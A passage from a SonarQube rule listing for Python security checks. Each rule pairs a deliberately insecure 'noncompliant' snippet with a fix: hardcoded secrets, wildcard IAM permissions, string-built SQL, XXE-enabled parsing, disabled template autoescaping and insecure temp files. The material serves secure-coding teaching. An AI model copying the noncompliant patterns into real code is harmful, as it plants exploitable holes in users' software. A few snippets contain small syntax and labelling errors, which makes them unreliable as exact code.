    def __init__(self, scope: Construct, construct_id: str, **kwargs) -&gt; None:
        super().__init__(scope, construct_id, **kwargs)

        CfnDomain(self, "Compliant",
            encryption_at_rest_options=CfnDomain.EncryptionAtRestOptionsProperty(
                enabled=True
            )
        )
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/opensearch-service/latest/developerguide/encryption-at-rest.html">AWS Documentation</a> - Encryption of
  data at rest for Amazon OpenSearch Service </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/311">CWE-311 - Missing Encryption of Sensitive Data</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S6437">
              python:S6437
            </a>
          </td>
          <td>
            <details>
              <p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<h3>What is the potential impact?</h3>
<p>The consequences vary greatly depending on the situation and the secret-exposed audience. Still, two main scenarios should be considered.</p>
<h4>Financial loss</h4>
<p>Financial losses can occur when a secret is used to access a paid third-party-provided service and is disclosed as part of the source code of
client applications. Having the secret, each user of the application will be able to use it without limit to use the third party service to their own
need, including in a way that was not expected.</p>
<p>This additional use of the secret will lead to added costs with the service provider.</p>
<p>Moreover, when rate or volume limiting is set up on the provider side, this additional use can prevent the regular operation of the affected
application. This might result in a partial denial of service for all the application’s users.</p>
<h4>Application’s security downgrade</h4>
<p>A downgrade can happen when the disclosed secret is used to protect security-sensitive assets or features of the application. Depending on the
affected asset or feature, the practical impact can range from a sensitive information leak to a complete takeover of the application, its hosting
server or another linked component.</p>
<p>For example, an application that would disclose a secret used to sign user authentication tokens would be at risk of user identity impersonation.
An attacker accessing the leaked secret could sign session tokens for arbitrary users and take over their privileges and entitlements.</p>
<h2>How to fix it</h2>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
<p>Before revoking the secret, ensure that no other applications or processes are using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p><strong>Analyze recent secret use</strong></p>
<p>When available, analyze authentication logs to identify any unintended or malicious use of the secret since its disclosure date. Doing this will
allow determining if an attacker took advantage of the leaked secret and to what extent.</p>
<p>This operation should be part of a global incident response process.</p>
<p><strong>Use a secret vault</strong></p>
<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected
disclosure.</p>
<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>
<h3>Code examples</h3>
<p>The following code example is noncompliant because it uses a hardcoded secret value.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
from requests_oauthlib.oauth2_session import OAuth2Session

scope = ['https://www.api.example.com/auth/example.data']

oauth = OAuth2Session(
    'example_client_id',
    redirect_uri='https://callback.example.com/uri',
    scope=scope)

token = oauth.fetch_token(
        'https://api.example.com/o/oauth2/token',
        client_secret='example_Password') # Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
from os import environ
from requests_oauthlib.oauth2_session import OAuth2Session

scope = ['https://www.api.example.com/auth/example.data']

oauth = OAuth2Session(
    'example_client_id',
    redirect_uri='https://callback.example.com/uri',
    scope=scope)

password = environ.get('OAUTH_SECRET')

token = oauth.fetch_token(
        'https://api.example.com/o/oauth2/token',
        client_secret=password)
</pre>
<h3>How does this work?</h3>
<p>While the noncompliant code example contains a hard-coded password, the compliant solution retrieves the secret’s value from its environment. This
allows to have an environment-dependent secret value and avoids storing the password in the source code itself.</p>
<p>Depending on the application and its underlying infrastructure, how the secret gets added to the environment might change.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> AWS Documentation - <a href="https://docs.aws.amazon.com/secretsmanager/latest/userguide/intro.html">What is AWS Secrets Manager</a> </li>
  <li> Azure Documentation - <a href="https://learn.microsoft.com/en-us/azure/key-vault/">Azure Key Vault</a> </li>
  <li> Google Cloud - <a href="https://cloud.google.com/secret-manager/docs">Secret Manager documentation</a> </li>
  <li> HashiCorp Developer - <a href="https://developer.hashicorp.com/vault/docs">Vault Documentation</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 - Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication">Top 10 2017 - Category A2 - Broken
  Authentication</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/798">CWE-798 - Use of Hard-coded Credentials</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/259">CWE-259 - Use of Hard-coded Password</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S6317">
              python:S6317
            </a>
          </td>
          <td>
            <details>
              <p>Within IAM, identity-based policies grant permissions to users, groups, or roles, and enable specific actions to be performed on designated
resources. When an identity policy inadvertently grants more privileges than intended, certain users or roles might be able to perform more actions
than expected. This can lead to potential security risks, as it enables malicious users to escalate their privileges from a lower level to a higher
level of access.</p>
<h2>Why is this an issue?</h2>
<p>AWS Identity and Access Management (IAM) is the service that defines access to AWS resources. One of the core components of IAM is the policy
which, when attached to an identity or a resource, defines its permissions. Policies granting permission to an identity (a user, a group or a role)
are called identity-based policies. They add the ability to an identity to perform a predefined set of actions on a list of resources.</p>
<p>For such policies, it is easy to define very broad permissions (by using wildcard <code>"*"</code> permissions for example.) This is especially
true if it is not yet clear which permissions will be required for a specific workload or use case. However, it is important to limit the amount of
permissions that are granted and the amount of resources to which these permissions are granted. Doing so ensures that there are no users or roles
that have more permissions than they need.</p>
<p>If this is not done, it can potentially carry security risks in the case that an attacker gets access to one of these identities.</p>
<h3>What is the potential impact?</h3>
<p>AWS IAM policies that contain overly broad permissions can lead to privilege escalation by granting users more access than necessary. They may be
able to perform actions beyond their intended scope.</p>
<h4>Privilege escalation</h4>
<p>When IAM policies are too permissive, they grant users more privileges than necessary, allowing them to perform actions that they should not be
able to. This can be exploited by attackers to gain unauthorized access to sensitive resources and perform malicious activities.</p>
<p>For example, if an IAM policy grants a user unrestricted access to all S3 buckets in an AWS account, the user can potentially read, write, and
delete any object within those buckets. If an attacker gains access to this user’s credentials, they can exploit this overly permissive policy to
exfiltrate sensitive data, modify or delete critical files, or even launch further attacks within the AWS environment. This can have severe
consequences, such as data breaches, service disruptions, or unauthorized access to other resources within the AWS account.</p>
<h2>How to fix it in AWS CDK</h2>
<h3>Code examples</h3>
<p>In this example, the IAM policy allows an attacker to update the code of any Lambda function. An attacker can achieve privilege escalation by
altering the code of a Lambda that executes with high privileges.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
from aws_cdk.aws_iam import Effect, PolicyDocument, PolicyStatement

PolicyDocument(
    statements=[
        PolicyStatement(
            effect=Effect.ALLOW,
            actions=["lambda:UpdateFunctionCode"],
            resources=["*"]  # Noncompliant
        )
    ]
)
</pre>
<h4>Compliant solution</h4>
<p>The policy is narrowed such that only updates to the code of certain Lambda functions (without high privileges) are allowed.</p>
<pre data-diff-id="1" data-diff-type="compliant">
from aws_cdk.aws_iam import Effect, PolicyDocument, PolicyStatement

PolicyDocument(
    statements=[
        PolicyStatement(
            effect=Effect.ALLOW,
            actions=["lambda:UpdateFunctionCode"],
            resources=[
                "arn:aws:lambda:us-east-2:123456789012:function:my-function:1"
            ]
        )
    ]
)
</pre>
<h3>How does this work?</h3>
<h4>Principle of least privilege</h4>
<p>When creating IAM policies, it is important to adhere to the principle of least privilege. This means that any user or role should only be granted
enough permissions to perform the tasks that they are supposed to, and <em>nothing else</em>.</p>
<p>To successfully implement this, it is easier to start from nothing and gradually build up all the needed permissions. When starting from a policy
with overly broad permissions which is made stricter at a later time, it can be harder to ensure that there are no gaps that might be forgotten about.
In this case, it might be useful to monitor the users or roles to verify which permissions are used.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> AWS Documentation - <a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies.html#grant-least-priv">Policies and permissions
  in IAM: Grant least privilege</a> </li>
</ul>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> Rhino Security Labs - <a href="https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/">AWS IAM Privilege Escalation -
  Methods and Mitigation</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/284">CWE-269 - Improper Privilege Management</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S2077">
              python:S2077
            </a>
          </td>
          <td>
            <details>
              <p>Formatted SQL queries can be difficult to maintain, debug and can increase the risk of SQL injection when concatenating untrusted values into the
query. However, this rule doesn’t detect SQL injections (unlike rule <a href='/organizations/sopra-steria/rules?open=python%3AS3649&rule_key=python%3AS3649'>S3649</a>), the goal is only to highlight complex/formatted
queries.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Some parts of the query come from untrusted values (like user inputs). </li>
  <li> The query is repeated/duplicated in other parts of the code. </li>
  <li> The application must support different types of relational databases. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Use <a href="https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html">parameterized queries, prepared
  statements, or stored procedures</a> and bind variables to SQL query parameters. </li>
  <li> Consider using ORM frameworks if there is a need to have an abstract layer to access data. </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
from django.db import models
from django.db import connection
from django.db import connections
from django.db.models.expressions import RawSQL

value = input()


class MyUser(models.Model):
    name = models.CharField(max_length=200)


def query_my_user(request, params, value):
    with connection.cursor() as cursor:
        cursor.execute("{0}".format(value))  # Sensitive

    # https://docs.djangoproject.com/en/2.1/ref/models/expressions/#raw-sql-expressions

    RawSQL("select col from %s where mycol = %s and othercol = " + value, ("test",))  # Sensitive

    # https://docs.djangoproject.com/en/2.1/ref/models/querysets/#extra

    MyUser.objects.extra(
        select={
            'mycol':  "select col from sometable here mycol = %s and othercol = " + value}, # Sensitive
           select_params=(someparam,),
        },
    )
</pre>
<h2>Compliant Solution</h2>
<pre>
cursor = connection.cursor(prepared=True)
sql_insert_query = """ select col from sometable here mycol = %s and othercol = %s """

select_tuple = (1, value)

cursor.execute(sql_insert_query, select_tuple) # Compliant, the query is parameterized
connection.commit()
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/89">CWE-89 - Improper Neutralization of Special Elements used in an SQL Command</a> </li>
  <li> Derived from FindSecBugs rules <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_JPA">Potential SQL/JPQL Injection
  (JPA)</a>, <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_JDO">Potential SQL/JDOQL Injection (JDO)</a>, <a
  href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_HIBERNATE">Potential SQL/HQL Injection (Hibernate)</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S6319">
              python:S6319
            </a>
          </td>
          <td>
            <details>
              <p>Amazon SageMaker is a managed machine learning service in a hosted production-ready environment. To train machine learning models, SageMaker
instances can process potentially sensitive data, such as personal information that should not be stored unencrypted. In the event that adversaries
physically access the storage media, they cannot decrypt encrypted data.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The instance contains sensitive data that could cause harm when leaked. </li>
  <li> There are compliance requirements for the service to store data encrypted. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to encrypt SageMaker notebook instances that contain sensitive information. Encryption and decryption are handled transparently by
SageMaker, so no further modifications to the application are necessary.</p>
<h2>Sensitive Code Example</h2>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_sagemaker/CfnNotebookInstance.html">aws_cdk.aws_sagemaker.CfnNotebookInstance</a>:</p>
<pre>
from aws_cdk import (
    aws_sagemaker as sagemaker
)

class CfnSagemakerStack(Stack):
    def __init__(self, scope: Construct, construct_id: str, **kwargs) -&gt; None:
        super().__init__(scope, construct_id, **kwargs)

        sagemaker.CfnNotebookInstance(
            self, "Sensitive",
            instance_type="instanceType",
            role_arn="roleArn"
        )  # Sensitive, no KMS key is set by default; thus, encryption is disabled
</pre>
<h2>Compliant Solution</h2>
<p>For <a
href="https://docs.aws.amazon.com/cdk/api/v2/python/aws_cdk.aws_sagemaker/CfnNotebookInstance.html">aws_cdk.aws_sagemaker.CfnNotebookInstance</a>:</p>
<pre>
from aws_cdk import (
    aws_sagemaker as sagemaker,
    aws_kms as kms
)

class CfnSagemakerStack(Stack):
    def __init__(self, scope: Construct, construct_id: str, **kwargs) -&gt; None:
        super().__init__(scope, construct_id, **kwargs)

        my_key = kms.Key(self, "Key")
        sagemaker.CfnNotebookInstance(
            self, "Compliant",
            instance_type="instanceType",
            role_arn="roleArn",
            kms_key_id=my_key.key_id
        )
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/sagemaker/latest/dg/encryption-at-rest.html">Protect Data at Rest Using Encryption</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/311">CWE-311 - Missing Encryption of Sensitive Data</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S2755">
              python:S2755
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability allows the usage of external entities in XML.</p>
<h2>Why is this an issue?</h2>
<p>External Entity Processing allows for XML parsing with the involvement of external entities. However, when this functionality is enabled without
proper precautions, it can lead to a vulnerability known as XML External Entity (XXE) attack.</p>
<h3>What is the potential impact?</h3>
<h4>Exposing sensitive data</h4>
<p>One significant danger of XXE vulnerabilities is the potential for sensitive data exposure. By crafting malicious XML payloads, attackers can
reference external entities that contain sensitive information, such as system files, database credentials, or configuration files. When these
entities are processed during XML parsing, the attacker can extract the contents and gain unauthorized access to sensitive data. This poses a severe
threat to the confidentiality of critical information.</p>
<h4>Exhausting system resources</h4>
<p>Another consequence of XXE vulnerabilities is the potential for denial-of-service attacks. By exploiting the ability to include external entities,
attackers can construct XML payloads that cause resource exhaustion. This can overwhelm the system’s memory, CPU, or other critical resources, leading
to system unresponsiveness or crashes. A successful DoS attack can disrupt the availability of services and negatively impact the user experience.</p>
<h4>Forging requests</h4>
<p>XXE vulnerabilities can also enable Server-Side Request Forgery (SSRF) attacks. By leveraging the ability to include external entities, an attacker
can make the vulnerable application send arbitrary requests to other internal or external systems. This can result in unintended actions, such as
retrieving data from internal resources, scanning internal networks, or attacking other systems. SSRF attacks can lead to severe consequences,
including unauthorized data access, system compromise, or even further exploitation within the network infrastructure.</p>
<h2>How to fix it in Python Standard Library</h2>
<h3>Code examples</h3>
<p>The following code contains examples of XML parsers that have external entity processing enabled. As a result, the parsers are vulnerable to XXE
attacks if an attacker can control the XML file that is processed.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="11" data-diff-type="noncompliant">
import xml.sax

parser = xml.sax.make_parser()
myHandler = MyHandler()
parser.setContentHandler(myHandler)
parser.setFeature(feature_external_ges, True) # Noncompliant
parser.parse('xxe.xml')
</pre>
<h4>Compliant solution</h4>
<p>The SAX parser does not process general external entities by default since version 3.7.1.</p>
<pre data-diff-id="11" data-diff-type="compliant">
import xml.sax

parser = xml.sax.make_parser()
myHandler = MyHandler()
parser.setContentHandler(myHandler)
parser.setFeature(feature_external_ges, False)
parser.parse('xxe.xml')
</pre>
<h3>How does this work?</h3>
<h4>Disable external entities</h4>
<p>The most effective approach to prevent XXE vulnerabilities is to disable external entity processing entirely, unless it is explicitly required for
specific use cases. By default, XML parsers should be configured to reject the processing of external entities. This can be achieved by setting the
appropriate properties or options in your XML parser library or framework.</p>
<p>If external entity processing is necessary for certain scenarios, adopt a whitelisting approach to restrict the entities that can be resolved
during XML parsing. Create a list of trusted external entities and disallow all others. This approach ensures that only known and safe entities are
processed.<br> You should rely on features provided by your XML parser to restrict the external entities.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A4_2017-XML_External_Entities_(XXE)">Top 10 2017 Category A4 - XML External
  Entities (XXE)</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/611">CWE-611 - Information Exposure Through XML External Entity Reference</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/827">CWE-827 - Improper Control of Document Type Definition</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S5439">
              python:S5439
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated; use <a href='/organizations/sopra-steria/rules?open=python%3AS5247&rule_key=python%3AS5247'>S5247</a> instead.</p>
<h2>Why is this an issue?</h2>
<p>Template engines have an HTML autoescape mechanism that protects web applications against most common cross-site-scripting (XSS)
vulnerabilities.</p>
<p>By default, it automatically replaces HTML special characters in any template variables. This secure by design configuration should not be globally
disabled.</p>
<p>Escaping HTML from template variables prevents switching into any execution context, like <code>&lt;script&gt;</code>. Disabling autoescaping
forces developers to manually escape each template variable for the application to be safe. A more pragmatic approach is to escape by default and to
manually disable escaping when needed.</p>
<p>A successful exploitation of a cross-site-scripting vulnerability by an attacker allow him to execute malicious JavaScript code in a user’s web
browser. The most severe XSS attacks involve:</p>
<ul>
  <li> Forced redirection </li>
  <li> Modify presentation of content </li>
  <li> User accounts takeover after disclosure of sensitive information like session cookies or passwords </li>
</ul>
<p>This rule supports the following libraries:</p>
<ul>
  <li> <a href="https://github.com/django/django">Django Templates</a> </li>
  <li> <a href="https://github.com/pallets/jinja">Jinja2</a> </li>
</ul>
<h3>Noncompliant code example</h3>
<pre>
from jinja2 import Environment

env = Environment() # Noncompliant; New Jinja2 Environment has autoescape set to false
env = Environment(autoescape=False) # Noncompliant
</pre>
<h3>Compliant solution</h3>
<pre>
from jinja2 import Environment
env = Environment(autoescape=True) # Compliant
</pre>
<h2>Resources</h2>
<ul>
  <li> <a href="https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.md">OWASP Cheat
  Sheet</a> - XSS Prevention Cheat Sheet </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)">Top 10 2017 Category A7 - Cross-Site Scripting
  (XSS)</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/79">CWE-79 - Improper Neutralization of Input During Web Page Generation ('Cross-site
  Scripting')</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/80">CWE-80 - Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic
  XSS)</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/81">CWE-81 - Improper Neutralization of Script in an Error Message Web Page</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/82">CWE-82 - Improper Neutralization of Script in Attributes of IMG Tags in a Web
  Page</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/83">CWE-83 - Improper Neutralization of Script in Attributes in a Web Page</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/84">CWE-84 - Improper Neutralization of Encoded URI Schemes in a Web Page</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/85">CWE-85 - Doubled Character XSS Manipulations</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/86">CWE-86 - Improper Neutralization of Invalid Characters in Identifiers in Web
  Pages</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/87">CWE-87 - Improper Neutralization of Alternate XSS Syntax</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S6779">
              python:S6779
            </a>
          </td>
          <td>
            <details>
              <p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<h3>What is the potential impact?</h3>
<p>If a Flask secret key leaks to an unintended audience, it can have serious security implications for the corresponding application. The secret key
is used to sign cookies and other sensitive data so that an attacker could potentially use it to perform malicious actions.</p>
<p>For example, an attacker could use the secret key to create their own cookies that appear to be legitimate, allowing them to bypass authentication
and gain access to sensitive data or functionality.</p>
<p>In the worst-case scenario, an attacker could be able to execute arbitrary code on the application and take over its hosting server.</p>
<h2>How to fix it</h2>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
<p>Before revoking the secret, ensure that no other applications or processes are using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p>In Flask, changing the secret value is sufficient to invalidate any data that it protected.</p>
<p><strong>Use a secret vault</strong></p>
<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected
disclosure.</p>
<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
from flask import Flask

app = Flask(__name__)
app.config['SECRET_KEY'] = "secret"  # Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
from flask import Flask
import os

app = Flask(__name__)
app.config['SECRET_KEY'] = os.environ["SECRET_KEY"]
</pre>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/798">CWE-798 - Use of Hard-coded Credentials</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/259">CWE-259 - Use of Hard-coded Password</a> </li>
</ul>
<h3>Documentation</h3>
<ul>
  <li> Flask documentation - <a href="https://flask.palletsprojects.com/en/2.3.x/config/#SECRET_KEY">Config - SECRET_KEY</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S5443">
              python:S5443
            </a>
          </td>
          <td>
            <details>
              <p>Operating systems have global directories where any user has write access. Those folders are mostly used as temporary storage areas like
<code>/tmp</code> in Linux based systems. An application manipulating files from these folders is exposed to race conditions on filenames: a malicious
user can try to create a file with a predictable name before the application does. A successful attack can result in other files being accessed,
modified, corrupted or deleted. This risk is even higher if the application runs with elevated permissions.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul>
  <li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2012-2451">CVE-2012-2451</a> </li>
  <li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2015-1838">CVE-2015-1838</a> </li>
</ul>
<p>This rule raises an issue whenever it detects a hard-coded path to a publicly writable directory like <code>/tmp</code> (see examples bellow). It
also detects access to environment variables that point to publicly writable directories, e.g., <code>TMP</code> and <code>TMPDIR</code>.</p>
<ul>
  <li> <code>/tmp</code> </li>
  <li> <code>/var/tmp</code> </li>
  <li> <code>/usr/tmp</code> </li>
  <li> <code>/dev/shm</code> </li>
  <li> <code>/dev/mqueue</code> </li>
  <li> <code>/run/lock</code> </li>
  <li> <code>/var/run/lock</code> </li>
  <li> <code>/Library/Caches</code> </li>
  <li> <code>/Users/Shared</code> </li>
  <li> <code>/private/tmp</code> </li>
  <li> <code>/private/var/tmp</code> </li>
  <li> <code>\Windows\Temp</code> </li>
  <li> <code>\Temp</code> </li>
  <li> <code>\TMP</code> </li>
</ul>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Files are read from or written into a publicly writable folder </li>
  <li> The application creates files with predictable names into a publicly writable folder </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Use a dedicated sub-folder with tightly controlled permissions </li>
  <li> Use secure-by-design APIs to create temporary files. Such API will make sure:
    <ul>
      <li> The generated filename is unpredictable </li>
      <li> The file is readable and writable only by the creating user ID </li>
      <li> The file descriptor is not inherited by child processes </li>
      <li> The file will be destroyed as soon as it is closed </li>
    </ul>  </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
file = open("/tmp/temporary_file","w+") # Sensitive
</pre>
<pre>
tmp_dir = os.environ.get('TMPDIR') # Sensitive
file = open(tmp_dir+"/temporary_file","w+")
</pre>
<h2>Compliant Solution</h2>
<pre>
import tempfile

file = tempfile.TemporaryFile(dir="/tmp/my_subdirectory", mode='"w+") # Compliant
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control">Top 10 2017 Category A5 - Broken Access Control</a>
  </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/377">CWE-377 - Insecure Temporary File</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/379">CWE-379 - Creation of Temporary File in Directory with Incorrect Permissions</a>
  </li>
  <li> <a href="https://owasp.org/www-community/vulnerabilities/Insecure_Temporary_File">OWASP, Insecure Temporary File</a> </li>
  <li> <a href="https://docs.python.org/3/library/tempfile.html">Python tempfile module</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=python:S5445">
              python:S5445
            </a>
          </td>
          <td>
            <details>
              <p>Temporary files are considered insecurely created when the file existence check is performed separately from the actual file creation. Such a
situation can occur when creating temporary files using normal file handling functions or when using dedicated temporary file handling functions that
are not atomic.</p>
<h2>Why is this an issue?</h2>
<p>Creating temporary files in a non-atomic way introduces race condition issues in the application’s behavior. Indeed, a third party can create a
given file between when the application chooses its name and when it creates it.</p>
<p>In such a situation, the application might use a temporary file that it does not entirely control. In particular, this file’s permissions might be
different than expected. This can lead to trust boundary issues.</p>
<h3>What is the potential impact?</h3>
<p>Attackers with control over a temporary file used by a vulnerable application will be able to modify it in a way that will affect the application’s
logic. By changing this file’s Access Control List or other operating system-level properties, they could prevent the file from being deleted or
emptied. They may also alter the file’s content before or while the application uses it.</p>
<p>Depending on why and how the affected temporary files are used, the exploitation of a race condition in an application can have various
consequences. They can range from sensitive information disclosure to more serious application or hosting infrastructure compromise.</p>
<h4>Information disclosure</h4>
<p>Because attackers can control the permissions set on temporary files and prevent their removal, they can read what the application stores in them.
This might be especially critical if this information is sensitive.</p>
<p>For example, an application might use temporary files to store users' session-related information. In such a case, attackers controlling those
files can access session-stored information. This might allow them to take over authenticated users' identities and entitlements.</p>
<h4>Attack surface extension</h4>
<p>An application might use temporary files to store technical data for further reuse or as a communication channel between multiple components. In
that case, it might consider those files part of the trust boundaries and use their content without additional security validation or sanitation. In
such a case, an attacker controlling the file content might use it as an attack vector for further compromise.</p>
<p>For example, an application might store serialized data in temporary files for later use. In such a case, attackers controlling those files'
content can change it in a way that will lead to an insecure deserialization exploitation. It might allow them to execute arbitrary code on the
application hosting server and take it over.</p>
<h2>How to fix it</h2>
<h3>Code examples</h3>
<p>The following code example is vulnerable to a race condition attack because it creates a temporary file using an unsafe API function.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
import tempfile

filename = tempfile.mktemp() # Noncompliant
tmp_file = open(filename, "w+")
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
